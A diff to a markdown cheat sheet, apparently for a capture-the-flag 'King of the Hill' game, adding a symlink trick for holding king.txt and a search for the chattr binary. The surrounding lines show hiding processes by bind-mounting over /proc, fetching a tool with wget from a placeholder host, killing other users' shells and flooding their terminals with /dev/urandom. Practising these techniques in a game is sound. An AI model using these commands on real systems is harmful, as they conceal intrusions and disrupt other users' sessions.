@@ -301,6 +301,14 @@ mount -o bind /tmp /proc/your-PID-here (Hide your PTS)
 
 mkdir /dev/shm/.hidden && mount -o bind /dev/shm/.hidden /proc/pid
 ```
+### symbolic-link-Tricks ✅
+```bash
+cp -r /root/ /dev/shm/...
+cd /dev/shm/.../root
+rm king.txt
+echo "YourNick" > ...
+ln -s ... king.txt
+```
 ### Kill_enemy_shell ✅
 ```bash
 wget http://yourip/nyancat
@@ -312,6 +320,8 @@ pkill -9 -t pts/<number>
 
 ps aux
 kill -9 $PID
+
+find / -size 36464c 2>/dev/null ( find chattr )
 
 cat /dev/urandom > /dev/pts/# ( sending spam for another user )
 cat /dev/urandom > $dir 2>/dev/null
